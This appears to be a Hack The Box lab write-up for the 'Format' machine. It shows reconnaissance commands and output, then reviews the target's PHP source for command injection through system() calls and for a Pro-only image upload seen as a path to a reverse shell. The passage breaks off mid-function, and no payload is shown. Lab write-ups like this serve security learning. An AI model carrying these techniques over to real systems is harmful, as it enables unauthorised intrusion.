<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="medium - Format User Flag Ok, after curl-ing it, we can quickly see a host:
z➤ curl -s -i format.htb | ag http HTTP/1.1 200 OK <meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://app.microblog.htb'&#34; /> Also nmap found these ports:
z➤ sudo nmap -n -Pn -sV -O -T4 format.htb ... 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 3000/tcp open http nginx 1.18.0 Also curl-ing the port 3000 reveals another host:"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="medium - Format User Flag Ok, after curl-ing it, we can quickly see a host:
z➤ curl -s -i format.htb | ag http HTTP/1.1 200 OK <meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://app.microblog.htb'&#34; /> Also nmap found these ports:
z➤ sudo nmap -n -Pn -sV -O -T4 format.htb ... 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 3000/tcp open http nginx 1.18.0 Also curl-ing the port 3000 reveals another host:"><meta property="og:title" content><meta property="og:description" content="medium - Format User Flag Ok, after curl-ing it, we can quickly see a host:
z➤ curl -s -i format.htb | ag http HTTP/1.1 200 OK <meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://app.microblog.htb'&#34; /> Also nmap found these ports:
z➤ sudo nmap -n -Pn -sV -O -T4 format.htb ... 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 3000/tcp open http nginx 1.18.0 Also curl-ing the port 3000 reveals another host:"><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/medium/format/"><meta property="article:section" content="infosec"><title>medium - Format </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/medium/format/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=medium---format>medium - Format
<a class=heading-link href=#medium---format><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Ok, after curl-ing it, we can quickly see a host:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ curl -s -i format.htb | ag http
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>&lt;meta http-equiv=<span style=color:#0086d2>&#34;Refresh&#34;</span> <span style=color:#fb660a>content</span>=<span style=color:#0086d2>&#34;0; url=&#39;http://app.microblog.htb&#39;&#34;</span> /&gt;
</span></span></code></pre></div><p>Also nmap found these ports:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ sudo nmap -n -Pn -sV -O -T4 format.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.18.0
</span></span><span style=display:flex><span>3000/tcp open  http    nginx 1.18.0
</span></span></code></pre></div><p>Also curl-ing the port 3000 reveals another host:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ curl -i format.htb:3000
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>301</span> Moved Permanently
</span></span><span style=display:flex><span>Server: nginx/1.18.0
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#0086f7;font-weight:700>17</span> Aug <span style=color:#0086f7;font-weight:700>2023</span> 14:11:06 GMT
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>169</span>
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Location: http://microblog.htb:3000/
</span></span></code></pre></div><p>So now let&rsquo;s add add this to our <code>/etc/hosts</code>: <code>10.10.11.213 format.htb app.microblog.htb microblog.htb</code></p><p>Now let&rsquo;s review both sites. Both are Nginx, however, notice how Cookies are set:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ curl -sI http://app.microblog.htb/
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/1.18.0
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#0086f7;font-weight:700>17</span> Aug <span style=color:#0086f7;font-weight:700>2023</span> 14:13:37 GMT
</span></span><span style=display:flex><span>Content-Type: text/html; <span style=color:#fb660a>charset</span>=UTF-8
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Set-Cookie: <span style=color:#fb660a>username</span>=uf0igonsrjr7j0cplanah80ebl; <span style=color:#fb660a>path</span>=/; <span style=color:#fb660a>domain</span>=.microblog.htb
</span></span><span style=display:flex><span>Expires: Thu, <span style=color:#0086f7;font-weight:700>19</span> Nov <span style=color:#0086f7;font-weight:700>1981</span> 08:52:00 GMT
</span></span><span style=display:flex><span>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span style=display:flex><span>Pragma: no-cache
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>z➤ curl -sI http://microblog.htb:3000/
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/1.18.0
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#0086f7;font-weight:700>17</span> Aug <span style=color:#0086f7;font-weight:700>2023</span> 14:13:44 GMT
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Set-Cookie: <span style=color:#fb660a>i_like_gitea</span>=1a968aaba762fdd8; <span style=color:#fb660a>Path</span>=/; HttpOnly; <span style=color:#fb660a>SameSite</span>=Lax
</span></span></code></pre></div><p>Interested URLs scrapped:</p><ul><li><a href=http://app.microblog.htb/login/>http://app.microblog.htb/login/</a><ul><li>/dashboard</li><li>/login</li></ul></li><li><a href=http://microblog.htb:3000/cooper/microblog>http://microblog.htb:3000/cooper/microblog</a><ul><li>/explore/repos</li><li><a href=http://microblog.htb:3000/cooper/microblog.git>http://microblog.htb:3000/cooper/microblog.git</a></li></ul></li><li><a href=https://gitea.io>https://gitea.io</a><ul><li>Version used: 1.17.3</li></ul></li><li><a href=http://golang.org/>http://golang.org/</a></li><li><a href=https://github.com/go-gitea/gitea>https://github.com/go-gitea/gitea</a></li></ul><h3 id=test-001>Test 001
<a class=heading-link href=#test-001><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Ok, so I went into app.microblog.htb and created a site:<figure class=image-container><a href=/i/2023-08-17_10-27.png><img width=100% src=/i/2023-08-17_10-27.png alt="Site creation"></a><figcaption>&#8213; Site creation &#8213;</figcaption></figure></p><p>After site creation you can reach your site as: <code>http://foo.microblog.htb/edit</code> or <code>http://foo.microblog.htb/</code></p><p>Then reviewed the source code found in Gitea, this functions seems to be related from <code>./microblog/app/dashboard/index.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#fb660a;font-weight:700>function</span> <span style=color:#ff0086;font-weight:700>addSite</span>(<span style=color:#fb660a>$site_name</span>) {
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span>(isset(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#080;background-color:#0f140f;font-style:italic>//check if site already exists
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>        <span style=color:#fb660a>$scan</span> = glob(<span style=color:#0086d2>&#39;/var/www/microblog/*&#39;</span>, GLOB_ONLYDIR);
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$taken_sites</span> = <span style=color:#fb660a;font-weight:700>array</span>();
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>foreach</span>(<span style=color:#fb660a>$scan</span> <span style=color:#fb660a;font-weight:700>as</span> <span style=color:#fb660a>$site</span>) {
</span></span><span style=display:flex><span>            array_push(<span style=color:#fb660a>$taken_sites</span>, substr(<span style=color:#fb660a>$site</span>, strrpos(<span style=color:#fb660a>$site</span>, <span style=color:#0086d2>&#39;/&#39;</span>) + <span style=color:#0086f7;font-weight:700>1</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(in_array(<span style=color:#fb660a>$site_name</span>, <span style=color:#fb660a>$taken_sites</span>)) {
</span></span><span style=display:flex><span>            header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Sorry, that site has already been taken&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>exit</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span> = <span style=color:#fb660a;font-weight:700>new</span> Redis();
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>connect</span>(<span style=color:#0086d2>&#39;/var/run/redis/redis.sock&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>LPUSH</span>(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>] . <span style=color:#0086d2>&#34;:sites&#34;</span>, <span style=color:#fb660a>$site_name</span>);
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$tmp_dir</span> = <span style=color:#0086d2>&#34;/tmp/&#34;</span> . generateRandomString(<span style=color:#0086f7;font-weight:700>7</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;mkdir -m 0700 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;cp -r /var/www/microblog-template/* &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;chmod 500 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog&#34;</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;cp -rp &#34;</span> . <span style=color:#fb660a>$tmp_dir</span> . <span style=color:#0086d2>&#34; /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$site_name</span>);
</span></span><span style=display:flex><span>	system(<span style=color:#0086d2>&#34;chmod -w microblog&#34;</span>);
</span></span><span style=display:flex><span>	system (<span style=color:#0086d2>&#34;chmod -R +w &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>	system(<span style=color:#0086d2>&#34;rm -r &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Site added successfully!&amp;status=success&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>else</span> {
</span></span><span style=display:flex><span>        header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Site not added, authentication failed&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>As you can notice we see a potential RCE given how they use the function <code>system()</code> and the var <code>$site_name</code>. Saddenly I wasn&rsquo;t able to revshell it, given this php condition: <code>if(!preg_match('/^[a-z]+$/', $_POST['new-blog-name']) || strlen($_POST['new-blog-name']) > 50)</code>.</p><p>But as per the source code, there are other posibilities as well, also notice that sunny.microblog.htb:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>microblog/sunny/edit/index.php
</span></span><span style=display:flex><span>28:        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span>);
</span></span><span style=display:flex><span>29:        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit&#34;</span>);
</span></span><span style=display:flex><span>30:        system(<span style=color:#0086d2>&#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit/&#34;</span>);
</span></span><span style=display:flex><span>31:        system(<span style=color:#0086d2>&#34;mkdir /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/uploads &amp;&amp; chmod 700 /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/uploads&#34;</span>);
</span></span><span style=display:flex><span>32:        system(<span style=color:#0086d2>&#34;chmod -w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit &amp;&amp; chmod -w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>microblog/app/dashboard/index.php
</span></span><span style=display:flex><span>77:        system(<span style=color:#0086d2>&#34;mkdir -m 0700 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>78:        system(<span style=color:#0086d2>&#34;cp -r /var/www/microblog-template/* &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>79:        system(<span style=color:#0086d2>&#34;chmod 500 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>80:        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog&#34;</span>);
</span></span><span style=display:flex><span>81:        system(<span style=color:#0086d2>&#34;cp -rp &#34;</span> . <span style=color:#fb660a>$tmp_dir</span> . <span style=color:#0086d2>&#34; /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$site_name</span>);
</span></span><span style=display:flex><span>82:     system(<span style=color:#0086d2>&#34;chmod -w microblog&#34;</span>);
</span></span><span style=display:flex><span>83:     system (<span style=color:#0086d2>&#34;chmod -R +w &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>84:     system(<span style=color:#0086d2>&#34;rm -r &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>microblog-template/edit/index.php
</span></span><span style=display:flex><span>28:        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span>);
</span></span><span style=display:flex><span>29:        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit&#34;</span>);
</span></span><span style=display:flex><span>30:        system(<span style=color:#0086d2>&#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit/&#34;</span>);
</span></span><span style=display:flex><span>31:        system(<span style=color:#0086d2>&#34;mkdir /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/uploads &amp;&amp; chmod 700 /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/uploads&#34;</span>);
</span></span><span style=display:flex><span>32:        system(<span style=color:#0086d2>&#34;chmod -w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span> . <span style=color:#0086d2>&#34;/edit &amp;&amp; chmod -w /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$blogName</span>);
</span></span></code></pre></div><h4 id=exploiting-upload-images>Exploiting upload images
<a class=heading-link href=#exploiting-upload-images><i class="fa fa-link" aria-hidden=true></i></a></h4><p>Ok, it seems that if we are capable of uploading images we can get some revshell in the server, only Pro users can have access to the Upload feature.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>//add image
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic></span><span style=color:#fb660a;font-weight:700>if</span> (isset(<span style=color:#fb660a>$_FILES</span>[<span style=color:#0086d2>&#39;image&#39;</span>]) &amp;&amp; isset(<span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span>(isPro() === <span style=color:#0086d2>&#34;false&#34;</span>) {
</span></span><span style=display:flex><span>        print_r(<span style=color:#0086d2>&#34;Pro subscription required to upload images&#34;</span>);
</span></span><span style=display:flex><span>        header(<span style=color:#0086d2>&#34;Location: /edit?message=Pro subscription required&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>exit</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$image</span> = <span style=color:#fb660a;font-weight:700>new</span> Bulletproof\Image(<span style=color:#fb660a>$_FILES</span>);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$image</span>-&gt;<span style=color:#ff0086;font-weight:700>setLocation</span>(getcwd() . <span style=color:#0086d2>&#34;/../uploads&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$image</span>-&gt;<span style=color:#ff0086;font-weight:700>setSize</span>(<span style=color:#0086f7;font-weight:700>100</span>, <span style=color:#0086f7;font-weight:700>3000000</span>);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$image</span>-&gt;<span style=color:#ff0086;font-weight:700>setMime</span>(<span style=color:#fb660a;font-weight:700>array</span>(<span style=color:#0086d2>&#39;png&#39;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span>(<span style=color:#fb660a>$image</span>[<span style=color:#0086d2>&#34;image&#34;</span>]) {
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$upload</span> = <span style=color:#fb660a>$image</span>-&gt;<span style=color:#ff0086;font-weight:700>upload</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(<span style=color:#fb660a>$upload</span>) {
</span></span><span style=display:flex><span>            <span style=color:#fb660a>$upload_path</span> = <span style=color:#0086d2>&#34;/uploads/&#34;</span> . <span style=color:#fb660a>$upload</span>-&gt;<span style=color:#ff0086;font-weight:700>getName</span>() . <span style=color:#0086d2>&#34;.png&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#fb660a>$html</span> = <span style=color:#0086d2>&#34;&lt;div class = </span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>blog-image</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>&gt;&lt;img src = </span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>{</span><span style=color:#fb660a>$upload_path</span><span style=color:#0086d2>}</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2> /&gt;&lt;/div&gt;&#34;</span>;
</span></span><span style=display:flex><span>            chdir(getcwd() . <span style=color:#0086d2>&#34;/../content&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#fb660a>$post_file</span> = fopen(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{</span><span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>, <span style=color:#0086d2>&#34;w&#34;</span>);
</span></span><span style=display:flex><span>            fwrite(<span style=color:#fb660a>$post_file</span>, <span style=color:#fb660a>$html</span>);
</span></span><span style=display:flex><span>            fclose(<span style=color:#fb660a>$post_file</span>);
</span></span><span style=display:flex><span>            <span style=color:#fb660a>$order_file</span> = fopen(<span style=color:#0086d2>&#34;order.txt&#34;</span>, <span style=color:#0086d2>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>            fwrite(<span style=color:#fb660a>$order_file</span>, <span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>] . <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>);  
</span></span><span style=display:flex><span>            fclose(<span style=color:#fb660a>$order_file</span>);
</span></span><span style=display:flex><span>            header(<span style=color:#0086d2>&#34;Location: /edit?message=Image uploaded successfully&amp;status=success&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>else</span> {
</span></span><span style=display:flex><span>            header(<span style=color:#0086d2>&#34;Location: /edit?message=Image upload failed&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So, how to become Pro?, check this site creation function, you will see nothing related to Pro feature.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#fb660a;font-weight:700>function</span> <span style=color:#ff0086;font-weight:700>addSite</span>(<span style=color:#fb660a>$site_name</span>) {
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span>(isset(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#080;background-color:#0f140f;font-style:italic>//check if site already exists
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>        <span style=color:#fb660a>$scan</span> = glob(<span style=color:#0086d2>&#39;/var/www/microblog/*&#39;</span>, GLOB_ONLYDIR);
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$taken_sites</span> = <span style=color:#fb660a;font-weight:700>array</span>();
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>foreach</span>(<span style=color:#fb660a>$scan</span> <span style=color:#fb660a;font-weight:700>as</span> <span style=color:#fb660a>$site</span>) {
</span></span><span style=display:flex><span>            array_push(<span style=color:#fb660a>$taken_sites</span>, substr(<span style=color:#fb660a>$site</span>, strrpos(<span style=color:#fb660a>$site</span>, <span style=color:#0086d2>&#39;/&#39;</span>) + <span style=color:#0086f7;font-weight:700>1</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(in_array(<span style=color:#fb660a>$site_name</span>, <span style=color:#fb660a>$taken_sites</span>)) {
</span></span><span style=display:flex><span>            header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Sorry, that site has already been taken&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>exit</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span> = <span style=color:#fb660a;font-weight:700>new</span> Redis();
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>connect</span>(<span style=color:#0086d2>&#39;/var/run/redis/redis.sock&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>LPUSH</span>(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>] . <span style=color:#0086d2>&#34;:sites&#34;</span>, <span style=color:#fb660a>$site_name</span>);
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$tmp_dir</span> = <span style=color:#0086d2>&#34;/tmp/&#34;</span> . generateRandomString(<span style=color:#0086f7;font-weight:700>7</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;mkdir -m 0700 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;cp -r /var/www/microblog-template/* &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;chmod 500 &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;chmod +w /var/www/microblog&#34;</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;cp -rp &#34;</span> . <span style=color:#fb660a>$tmp_dir</span> . <span style=color:#0086d2>&#34; /var/www/microblog/&#34;</span> . <span style=color:#fb660a>$site_name</span>);
</span></span><span style=display:flex><span>	system(<span style=color:#0086d2>&#34;chmod -w microblog&#34;</span>);
</span></span><span style=display:flex><span>	system (<span style=color:#0086d2>&#34;chmod -R +w &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>	system(<span style=color:#0086d2>&#34;rm -r &#34;</span> . <span style=color:#fb660a>$tmp_dir</span>);
</span></span><span style=display:flex><span>        header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Site added successfully!&amp;status=success&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>else</span> {
</span></span><span style=display:flex><span>        header(<span style=color:#0086d2>&#34;Location: /dashboard?message=Site not added, authentication failed&amp;status=fail&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now check this function that checks wether a user is Pro or not:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#fb660a;font-weight:700>function</span> <span style=color:#ff0086;font-weight:700>isPro</span>() {
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span>(isset(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>])) {
